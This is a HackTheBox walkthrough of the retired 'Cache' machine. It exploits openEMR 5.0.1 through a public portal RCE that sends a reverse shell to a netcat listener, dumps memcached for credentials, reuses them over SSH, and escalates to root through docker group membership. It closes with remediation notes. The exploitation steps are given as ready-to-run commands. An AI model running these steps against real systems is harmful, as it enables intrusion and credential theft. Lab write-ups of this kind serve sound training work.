HTB Cache: openEMR portal RCE and a docker group escape

retired-machineeasy

Cache is an easy Linux box with a medical-records theme: Apache serving openEMR 5.0.1 plus a memcached daemon, and a docker installation for the finale. The story in one line: version the clinic app, ride the public portal exploit chain to a web shell, dump the cache for credentials, move laterally to ash, and mount the host through the docker group. This walkthrough follows that order — recon, foothold, lateral move, privilege escalation — with the commands and outputs at each step.

$ Box info

OS: Linux. Difficulty: easy. Address: 10.10.10.188. Services that matter: OpenSSH on 22, Apache on 80 (openEMR clinic app), memcached on 11211. Skills exercised: web enumeration and version matching, public exploit operation, cache-protocol credential recovery, docker-group escape.

$ Skills required

Nmap service enumeration, web directory discovery, matching application versions to public exploits, netcat listener handling and shell stabilization, memcached protocol basics, SSH reuse, docker fundamentals.

$ Recon — initial scanning

# nmap: all ports, then targeted scripts and versions
nmap -p- --min-rate=1000 -Pn -T4 10.10.10.188 -oN cache.all
nmap -p22,80,11211 -Pn -sC -sV 10.10.10.188 -oN cache.targeted
# nmap: the three services that matter
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
11211/tcp open  memcache

Three services, no more: SSH for later credential reuse, Apache hosting the actual application, and memcached — a cache daemon speaking a friendly plaintext protocol. Note the Apache version string and move to the web app before touching anything else.

$ Recon — the clinic app on TCP 80

Port 80 serves a hospital-themed landing page with a login, and directory discovery finds the real application under /openemr. The login page advertises version 5.0.1 in its footer — a versioned, healthcare-adjacent PHP application is the lead for the whole box, so confirm the version string and immediately match it against the public exploit set instead of brute-forcing credentials.

# bash: find the app and match the version to exploits
gobuster dir -u http://10.10.10.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40
# -> /openemr (login page footer: v5.0.1)
searchsploit openemr 5.0.1

Searchsploit returns public exploit coverage for openEMR 5.0.1: a patient-portal authentication bypass chained to remote code execution. That chain needs no valid credentials, which is why login brute-forcing here is a dead end — version-match first, then operate the public chain.

$ Foothold — openEMR portal exploit chain

Set up the listener first, then run the matched public exploit against the /openemr path with your callback address and port. The portal bypass lands execution as the web user and calls back to the listener.

# bash: listener up, then the public portal chain
nc -lvnp 4444
# in a second terminal, against the lab target:
python3 openemr-501-rce.py http://10.10.10.188/openemr 10.10.14.23 4444
# nc: the www-data callback
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.188] 43012
$ whoami
www-data

Stabilize before doing anything else: upgrade to a full pty with python, background the shell, set the terminal to raw, and foreground again. Every later step — cache queries, SSH, docker — is smoother from a stable shell.

# bash: stabilize the web shell
python3 -c "import pty; pty.spawn("/bin/bash")"
# Ctrl+Z, then locally:
stty raw -echo; fg
# back in the shell:
export TERM=xterm; stty rows 40 cols 160

$ Enumeration as www-data

Take stock: there is a human user ash with a home directory, and user.txt sits there unreadable from www-data. Meanwhile port 11211 answers the memcached protocol. The box is literally named Cache — every cache, queue, and memory-store service on every box gets dumped, and here it is the intended second act, not noise.

# bash: users, flags, and the cache daemon
ls /home                 # -> ash
ls -l /home/ash/user.txt  # owned by ash, not readable yet
ss -tlnp | grep 11211     # memcached listening

$ Lateral move — dump the cache

Talk to memcached in its own language: list the slab items, dump the cached keys, then get each key. One of the cached entries holds credential material for the ash account — application caches routinely retain passwords and session data in plaintext.

# bash: memcached item dump and key read
(echo "stats items"; echo quit) | nc 127.0.0.1 11211
(echo "stats cachedump 1 0"; echo quit) | nc 127.0.0.1 11211
# -> key list; read each one:
(echo "get <KEY-FROM-CACHEDUMP>"; echo quit) | nc 127.0.0.1 11211
# -> credential material for ash

Reuse the recovered password over SSH as ash and read the user flag. Credentials found in caches are almost always reused somewhere nearby — SSH as the named home-directory user is the first place to try.

# bash: SSH reuse and the user flag
ssh ash@10.10.10.188
cat ~/user.txt   # (value redacted per HTB rules)

$ Privilege escalation — docker group escape

Check groups immediately after landing: id places ash in the docker group. Docker group membership is root-equivalent by design — any member can start a privileged container with the host filesystem mounted, which bypasses every file permission on the box. List the locally available images first so the run command references one that exists.

# bash: confirm the group, pick an image, mount the host
id                 # ... groups=... ,999(docker), ...
docker images      # use any image present locally
docker run --rm -it --privileged -v /:/mnt <IMAGE> chroot /mnt /bin/bash
# bash: root from inside the mounted host
cat /root/root.txt   # (value redacted per HTB rules)
cat /home/ash/user.txt

With the host root mounted at /mnt, both flags fall without any kernel exploit. Flag values are redacted per HTB rules — run these steps in your own lab to earn them.

$ Dead ends

Brute-forcing the openEMR login burns time the public chain never needed — the 5.0.1 portal chain bypasses authentication, so version-match before password-guessing. Treating memcached as background noise misses the lateral move — dump every cache and queue service on every machine. And reaching for kernel exploits before checking id output misses the intended finale: group membership is the finding.

$ Remediation notes

Patch openEMR past 5.0.1 immediately — medical-record systems raise every impact category. Firewall memcached to localhost and require authentication so application caches are never world-readable. Never grant docker group membership to service or human accounts that are not administrators; treat it as root-equivalent in every access review. Written by Lucky Thandel.
